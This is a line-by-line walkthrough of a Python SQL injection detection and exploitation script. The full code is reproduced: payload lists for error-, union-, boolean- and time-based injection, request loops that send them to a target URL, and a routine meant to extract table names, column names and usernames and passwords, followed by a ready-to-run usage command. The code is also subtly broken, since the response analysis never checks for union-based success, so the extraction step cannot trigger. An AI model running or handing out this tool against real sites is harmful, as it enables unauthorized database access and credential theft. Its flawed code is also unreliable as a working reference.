# SQL Injection Identifier and Exploiter: Line-by-Line Explanation

## **Libraries Overview**

### **1. requests**
- **Common Use**: The `requests` library is widely used for sending HTTP/HTTPS requests in Python.
- **In This Script**: It is used to send `GET` and `POST` requests to the target URL for testing and exploitation purposes.

### **2. argparse**
- **Common Use**: Helps in parsing command-line arguments for scripts.
- **In This Script**: Used to take inputs like the URL, HTTP method, parameter, and proxy settings from the user.

### **3. datetime**
- **Common Use**: Provides date and time functionality.
- **In This Script**: Used to add timestamps to the log file for better tracking of when vulnerabilities are detected.

---

## **Code Walkthrough**

### **Script Title and Description**
```python
"""
Title: SQL Injection Identifier and Exploiter
Description: Fuzzes target URL with SQL Injection payloads and identifies injection vulnerabilities.
Author: Chris Quinn
"""
```
- **Purpose**: Provides metadata about the script.
- **Description**: Explains the purpose of the script—to identify and optionally exploit SQL injection vulnerabilities.

---

### **parse_input() Function**
```python
def parse_input():
    parser = argparse.ArgumentParser(description="SQL Injection Identification and Exploitation Script")
    parser.add_argument("-u", required=True, help="URL to target (e.g., http://example.com/vuln.php)")
    parser.add_argument("-p", help="Vulnerable parameter name (e.g., 'id')")
    parser.add_argument("-m", default="GET", choices=["GET", "POST"],
                        help="HTTP method to use: GET or POST (default: GET)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    if not args.u.startswith(("http://", "https://")):
        parser.error("The URL must start with 'http://' or 'https://'.")

    param = args.p.strip() if args.p else None
    return args.u.strip(), param, args.m, args.proxy
```
- **Purpose**: Parse and validate command-line arguments.
- **Highlighted Lines**:
  - `parser.add_argument`: Defines the arguments the script expects.
    - `-u`: Mandatory URL input.
    - `-p`: Optional parameter name.
    - `-m`: HTTP method (`GET` or `POST`), defaulting to `GET`.
    - `--proxy`: Optional proxy URL for traffic inspection.
  - `if not args.u.startswith(("http://", "https://"))`: Ensures the URL is valid.
- **Return Value**: A tuple containing the URL, parameter, HTTP method, and proxy.

---

### **get_payloads() Function**
```python
def get_payloads():
    return {
        "error_based": [
            "' OR 1=1 --",
            "' AND 1=CONVERT(int, (SELECT @@version)) --"
        ],
        "union_based": [
            "' UNION SELECT NULL, NULL --",
            "' UNION SELECT username, password FROM users --"
        ],
        "boolean_based": [
            "' AND 1=1 --",
            "' AND 1=2 --"
        ],
        "time_based": [
            "' OR IF(1=1, SLEEP(5), 0) --",
            "' AND IF(1=1, SLEEP(5), 0) --"
        ]
    }
```
- **Purpose**: Defines SQL injection payloads grouped by attack type.
- **Highlighted Lines**:
  - Each key corresponds to an attack type (`error_based`, `union_based`, etc.).
  - Payloads under each key represent specific SQL injection strings.
- **Return Value**: A dictionary of payloads categorized by attack type.

---

### **test_injection() Function**
```python
def test_injection(url, param, method, payloads, proxies):
    vulnerable_types = []

    for attack_type, attack_payloads in payloads.items():
        print(f"\n[+] Testing {attack_type} injections...")
        for payload in attack_payloads:
            try:
                if method == "GET":
                    full_payload = f"{url}?{param}={payload}"
                    response = requests.get(full_payload, timeout=10, proxies=proxies)
                elif method == "POST":
                    data = {param: payload}
                    response = requests.post(url, data=data, timeout=10, proxies=proxies)
                    full_payload = f"POST Data: {data}"
                else:
                    print(f"[-] Unsupported HTTP method: {method}")
                    return []

                if analyze_response(response, attack_type, payload, full_payload):
                    vulnerable_types.append(attack_type)
                    break
            except requests.RequestException as e:
                print(f"[-] Request failed: {e}")
                continue

    return list(set(vulnerable_types))
```
- **Purpose**: Tests SQL injection payloads on the target URL and identifies vulnerabilities.
- **Highlighted Lines**:
  - `requests.get` and `requests.post`: Send the payloads to the target.
  - `analyze_response`: Analyzes the server's response for success indicators.
  - `vulnerable_types.append(attack_type)`: Tracks successful attack types.
- **Return Value**: A list of vulnerable attack types.

---

### **analyze_response() Function**
```python
def analyze_response(response, attack_type, payload, full_payload):
    if attack_type == "error_based" and any(
        error in response.text.lower() for error in ["syntax error", "unclosed quotation mark", "unknown column"]
    ):
        print(f"[+] Vulnerability detected with payload: {payload}")
        log_result(full_payload, response.text)
        return True

    elif attack_type == "boolean_based" and "true" in response.text.lower():
        print(f"[+] Boolean-based injection succeeded: {payload}")
        log_result(full_payload, response.text)
        return True

    elif attack_type == "time_based" and response.elapsed.total_seconds() > 5:
        print(f"[+] Time-based injection succeeded: {payload}")
        log_result(full_payload, f"Delay: {response.elapsed.total_seconds()} seconds")
        return True

    print(f"[-] No success detected for payload: {payload}")
    return False
```
- **Purpose**: Analyzes server responses for success indicators.
- **Highlighted Lines**:
  - `any(error in response.text.lower()...)`: Checks for database-specific error messages.
  - `response.elapsed.total_seconds()`: Measures delay for time-based injections.
  - Returns `True` if a vulnerability is detected.

---

### **extract_data() Function**
```python
def extract_data(url, param, method, vulnerable_types, proxies):
    union_extraction_payloads = [
        "' UNION SELECT table_name, NULL FROM information_schema.tables --",
        "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --",
        "' UNION SELECT username, password FROM users --"
    ]

    if "union_based" in vulnerable_types:
        print("\n[+] Attempting data extraction using union-based injections...")
        for payload in union_extraction_payloads:
            try:
                if method == "GET":
                    injected_url = f"{url}?{param}={payload}"
                    response = requests.get(injected_url, timeout=10, proxies=proxies)
                elif method == "POST":
                    data = {param: payload}
                    response = requests.post(url, data=data, timeout=10, proxies=proxies)

                print(f"\n[+] Payload: {payload}")
                print(f"Response:\n{response.text[:500]}...\n")
            except requests.RequestException as e:
                print(f"[-] Request failed: {e}")
```
- **Purpose**: Exploits union-based vulnerabilities to extract data.
- **Highlighted Lines**:
  - `response.text[:500]`: Displays partial responses for brevity.
  - `if "union_based" in vulnerable_types`: Ensures exploitation only proceeds if the vulnerability exists.

---

### **log_result() Function**
```python
def log_result(payload, response_excerpt):
    with open("sql_injection_results.txt", "a") as log_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f"Timestamp: {timestamp}\n")
        log_file.write(f"Payload: {payload}\n")
        log_file.write(f"Response: {response_excerpt[:200]}...\n")
        log_file.write(f"{'-' * 50}\n")
```
- **Purpose**: Logs successful payloads and responses to a file.
- **Highlighted Lines**:
    - `timestamp = datetime.now().strftime(...)`: Captures the current date and time in a readable format (e.g., 2025-01-22 14:30:00).
    - `response_excerpt[:200]`: Limits the logged response to the first 200 characters to avoid bloating the log file.
    - `log_file.write(...)`: Writes the timestamp, payload, and response excerpt into a text file, appending to the file if it already exists.


### **Main Script**
```python
if __name__ == "__main__":
    url, param, method, proxy = parse_input()
    payloads = get_payloads()
    
    proxies = {"http": proxy, "https": proxy} if proxy else None
    vulnerable_types = test_injection(url, param, method, payloads, proxies)
    
    if vulnerable_types:
        print(f"\n[+] Vulnerabilities detected: {', '.join(vulnerable_types)}")
        extract_data(url, param, method, vulnerable_types, proxies)
    else:
        print("[-] No vulnerabilities detected.")
```

- **Purpose**: Serves as the entry point for the script.
- **Highlighted Lines**:
    - `url, param, method, proxy` = parse_input(): Parses command-line arguments.
    - `payloads = get_payloads()`: Fetches the predefined SQL injection payloads.
    - `proxies = {"http": proxy, "https": proxy} if proxy else None`: Configures proxy settings if provided.
    - `test_injection(...)`: Tests for vulnerabilities using the defined payloads.
    - `extract_data(...)`: Attempts to exploit detected vulnerabilities if any are found.
    - `print(...)`: Provides user feedback about the results.

## Script Summary

1. Purpose
- Detect SQL injection vulnerabilities.
- Optionally exploit vulnerabilities to extract data using union-based SQL injection.

2. Features
- Supports GET and POST methods.
- Includes error-based, boolean-based, time-based, and union-based payloads.
- Optional proxy support for traffic inspection.
- Logs results to a file with timestamps.

3. Usage:

```bash
python sql_injection.py -u http://example.com/vuln.php -p id --proxy http://127.0.0.1:8080
```
